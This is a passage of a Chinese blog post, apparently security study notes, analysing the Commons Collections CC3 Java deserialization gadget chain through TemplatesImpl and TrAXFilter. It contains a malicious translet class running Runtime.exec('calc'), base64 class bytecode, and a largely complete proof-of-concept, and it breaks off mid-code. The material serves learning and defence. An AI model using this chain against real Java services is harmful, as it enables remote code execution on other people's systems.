class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Q-如何构造ChainedTransformers"><a href="#Q-如何构造ChainedTransformers" class="headerlink" title="Q: 如何构造ChainedTransformers?"></a>Q: 如何构造ChainedTransformers?</h2><blockquote><p>这里由于有点忘记前面的分析导致卡住了一会，先给出构造方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trueTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>)),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li><p>回到ChainedTransformer的<code>transform()</code></p><ol><li>可以知道每次会<code>transform(上一次的Object)</code></li><li>这里第二个InstantiateTransfomer调用的transform是会调用上一次的结果，这里的一个类对象，刚好和InstantiateTransformer中的transform的参数要求一致，即调用TrAXFilter的构造函数</li><li><strong>解答误解</strong>: 并不是Object.transform()，CC1和CC6中的Runtime可能产生了误解</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Q-如何进行序列化？"><a href="#Q-如何进行序列化？" class="headerlink" title="*Q: 如何进行序列化？"></a>*Q: 如何进行序列化？</h2><blockquote><p>!!!无法序列化的类可以仿照Runtime的解决方式，通过反射来实现</p></blockquote><ol><li><strong>Q: 注意到<code>TrAXFilter</code>这一个类并没有实现Serializable接口</strong><ol><li>A：这里的解决方式和Runtime一样，通过反射实现，并没有传输一个TrAXFilter对象，而是传输了Class对象(通过ConstantTransformer)，并通过InstantiateTransformer调用构造函数并返回实例</li></ol></li></ol><h2 id="Q-如何构造有害字节码"><a href="#Q-如何构造有害字节码" class="headerlink" title="Q: 如何构造有害字节码?"></a>Q: 如何构造有害字节码?</h2><ol><li><p>先说前提: TemplatesImpl链子利用的关键在<code>getTransletInstance()</code>方法中通过内部调用<code>defineTransletClasses()</code>定义恶意类并通过<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>来实例化 –&gt; 通过创建对象时构造函数等这是调用的函数中包含恶意命令来执行</p><ol><li><em><strong>Q: 为什么不能使用<code>static&#123;/*...*/&#125;</code>静态块呢？</strong></em>, Answer: 在 defineClass 时无法被直接调用到 static{}</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TemplatesImpl.java</span></span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里如果父类不是ABSTRACT_TRANSLET就会抛出异常，后续无法实例化</span></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="comment">/*...*/</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>我们就得出我们的要求了: 加载的字节码为一个恶意类，且需要是AbstractTranslet的子类，并且通过对象实例化触发恶意命令 -&gt; 使用构造函数</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TemplatesImplEvil.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplEvil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesImplEvil</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>在poc中使用：这里浓缩为函数</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getRCE</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/* * * * * * 1. 实现一: 返回字符串 * * * * * */</span></span><br><span class="line">    <span class="comment">// S1: maven compile</span></span><br><span class="line">    <span class="comment">// S2: wsl: cat ./xxx/xx.class | base64 &gt; /tmp/kc1zs4.txt</span></span><br><span class="line">    <span class="comment">// S3: 利用wsl: tr -d &#x27;\n&#x27; &lt; /tmp/kc1zs4.txt</span></span><br><span class="line">    <span class="comment">// return &quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNMVGVtcGxhdGVzSW1wbEV2aWw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwArBwApAQAKU291cmNlRmlsZQEAFlRlbXBsYXRlc0ltcGxFdmlsLmphdmEMABsAHAcALgwALwAwAQAEY2FsYwwAMQAyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAMwAcAQARVGVtcGxhdGVzSW1wbEV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAADAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEAARAAEAAAABABIAEwACABQAAAAEAAEAFQABAAkAFgACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAEQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEAARAAEAAAABABcAGAACAAAAAQAZABoAAwAUAAAABAABABUAAQAbABwAAQALAAAAfAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAwAMAAAAGgAGAAAAFAAEABcADQAaABAAGAARABkAFQAbAA0AAAAWAAIAEQAEAB0AHgABAAAAFgAOAA8AAAAfAAAAEAAC/wAQAAEHACAAAQcAIQQAAQAiAAAAAgAj&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* * * * * * 2. 实现二：通过文件读取 * * * * * */</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(</span><br><span class="line">            readAllBytes(Paths.get(<span class="string">&quot;D:\\Desktop\\CODE\\IDEA\\JavaSec\\JavaSec_CC_review\\target\\classes\\TemplatesImplEvil.class&quot;</span>))</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CC3-poc"><a href="#CC3-poc" class="headerlink" title="CC3 poc"></a>CC3 poc</h2><blockquote><p>版本：只⽀持Java 8u71及以下版本</p></blockquote><ol><li><p>首先亮出<strong>Gadget</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里的Gadget是LazyMap的</span></span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    AnnotationInvocationHandler.readObject()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    TemplatesImpl#newTransformer()</span><br><span class="line">                        TemplatesImpl#getTransletInstance()</span><br><span class="line">                            TemplatesImpl#defineTransletClasses()</span><br><span class="line">                                TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></li><li><p>直接写poc吧，TemplatesImpl和再3(2)中是一样的，条件不再分析了</p><blockquote><p>借鉴自p牛，由版本限制，但是可以仿照CC6进行修改</p></blockquote> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Base64.decode(</span><br><span class="line">                    <span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>)&#125;);</span><br><span class="line">            setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            <span class="comment">// setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// p牛的严谨性使用了伪装</span></span><br><span class="line">            Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> 